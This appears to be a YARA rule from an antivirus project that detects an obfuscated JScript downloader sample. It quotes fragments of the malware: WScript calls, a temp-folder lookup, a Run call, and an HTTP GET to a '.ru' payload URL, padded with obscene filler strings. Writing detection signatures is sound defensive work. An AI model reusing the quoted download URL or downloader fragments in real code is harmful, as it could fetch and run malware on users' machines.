rule sig_20160428_fa0937dec23b9bc870674ff5ebd38e30 {
  meta:
    description = "datamaliciousorder - file 20160428_fa0937dec23b9bc870674ff5ebd38e30.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "49a7f433ca6ccbba2fadd67834e53cb7b6ee9158174cd4911667d3c4a0f2e382"

  strings:
    $s1  = "function UekEclJdgDbgWwvRsgEwh(AusEizXucPnjVzdGleLqb){WiyFbpHgdNngIjbRpaBse[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function ZyzKqmHncEgrGmhZthSpf() {return WiyFbpHgdNngIjbRpaBse[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function UekEclJdgDbgWwvRsgEwh(AusEizXucPnjVzdGleLqb){WiyFbpHgdNngIjbRpaBse[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "return GfnXfaVcfGhrDytFumIhw - AeoWulSrmYlyKbzHdvNpr;};" fullword ascii
    $s5  = "var WiyFbpHgdNngIjbRpaBse = function NrxRoaShrGrmFfuEjtFun() {return LdxHhgWfyYbrDauQjiUas[KgvAltPyqRzaFdyCknTcv](\"WScript\"+\"" ascii
    $s6  = "function IcoWyaZgxKfuYgbJbyNfy(GfnXfaVcfGhrDytFumIhw, AeoWulSrmYlyKbzHdvNpr){SzdGunJgmVfsBxnFzpNkf = SzdGunJgmVfsBxnFzpNkf * 1; " ascii
    $s7  = "SpeRxnYstWljTllAaxSom[AcvRnyEsjZthAnaHohPcc](\"G\" + \"ET\", \"http://unipan96.ru/xo5ksp\", false);" fullword ascii
    $s8  = "var WiyFbpHgdNngIjbRpaBse = function NrxRoaShrGrmFfuEjtFun() {return LdxHhgWfyYbrDauQjiUas[KgvAltPyqRzaFdyCknTcv](\"WScript\"+\"" ascii
    $s9  = "var LdxHhgWfyYbrDauQjiUas = this[\"WScript\"];" fullword ascii
    $s10 = "function ZyzKqmHncEgrGmhZthSpf() {return WiyFbpHgdNngIjbRpaBse[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "if (SpeRxnYstWljTllAaxSom[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function IcoWyaZgxKfuYgbJbyNfy(GfnXfaVcfGhrDytFumIhw, AeoWulSrmYlyKbzHdvNpr){SzdGunJgmVfsBxnFzpNkf = SzdGunJgmVfsBxnFzpNkf * 1; " ascii
    $s13 = "function GhzEasHqyMxcRtwKsgRdr(){return JsuAgcYnpRtuIpeRvyPki + \"\";};" fullword ascii
    $s14 = "function KewRmdCmiIsrXykGbrIyw() {return ((SohIgiUkuRldLjpCeqRrm == true) && (SohIgiUkuRldLjpCeqRrm == VqqXqnUutYniDuzGjvTdx)) ?" ascii
    $s15 = "function KewRmdCmiIsrXykGbrIyw() {return ((SohIgiUkuRldLjpCeqRrm == true) && (SohIgiUkuRldLjpCeqRrm == VqqXqnUutYniDuzGjvTdx)) ?" ascii
    $s16 = "var JsqZgrUnxOkjYjqTnkJbd = new this[\"D\"+\"ate\"]();" fullword ascii
    $s17 = "var SohIgiUkuRldLjpCeqRrm = false;" fullword ascii
    $s18 = "var HooDxzKlyKxmJtzKxxFbw = false;" fullword ascii
    $s19 = "function DvsKvgBbwTnqBxyNjeJvc(){return 23;};" fullword ascii
    $s20 = "function OepCrjHzjKitZgmBepOud(KbrBhqVrzZttWmpIfaGpn) {var SrfCbaUcdZfsZhnXkdOkv = (1, 2, 3, 4, 5, KbrBhqVrzZttWmpIfaGpn); retur" ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}